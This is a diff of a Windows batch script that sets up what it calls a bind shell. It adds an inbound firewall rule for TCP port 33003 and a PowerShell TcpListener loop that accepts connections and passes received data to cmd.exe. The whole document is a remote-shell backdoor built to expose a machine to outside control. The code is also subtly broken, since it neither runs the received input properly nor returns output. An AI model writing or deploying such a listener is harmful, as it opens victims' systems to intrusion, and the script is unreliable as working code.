@@ -1,22 +1,16 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:loop
 REM Create a named pipe for communication
 set "pipe=\\.\pipe\bindshell"
 echo %pipe% > nul
 
 REM Start the server
-powershell -Command "New-NetFirewallRule -Name 'BindShell' -DisplayName 'BindShell' -Action Allow -Direction Inbound -Protocol TCP -LocalPort 33008"
+powershell -Command "New-NetFirewallRule -Name 'BindShell' -DisplayName 'BindShell' -Action Allow -Direction Inbound -Protocol TCP -LocalPort 33003"
 
-REM Listen on port 4444 and execute commands
+REM Listen on port 33003 and execute commands
 :listen
-for /f "tokens=*" %%a in ('powershell -Command "netstat -an | findstr LISTENING | findstr 33008"') do (
-    powershell -Command "cmd.exe /c '%%a'"
-)
-goto listen
+powershell -Command ^
+"while(1) { $s = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, 33003); $s.Start(); $c = $s.AcceptTcpClient(); $stream = $c.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while($stream.DataAvailable -or $c.Connected) { $stream.Read($bytes, 0, $bytes.Length) | Out-File -FilePath C:\temp\output.txt; cmd.exe /c type C:\temp\output.txt }; $s.Stop() }"
 
-REM If we reach here, something went wrong. Restart after delay
-echo Error occurred. Restarting in 5 seconds...
-timeout /t 5 /nobreak > nul
-goto loop
+goto listen
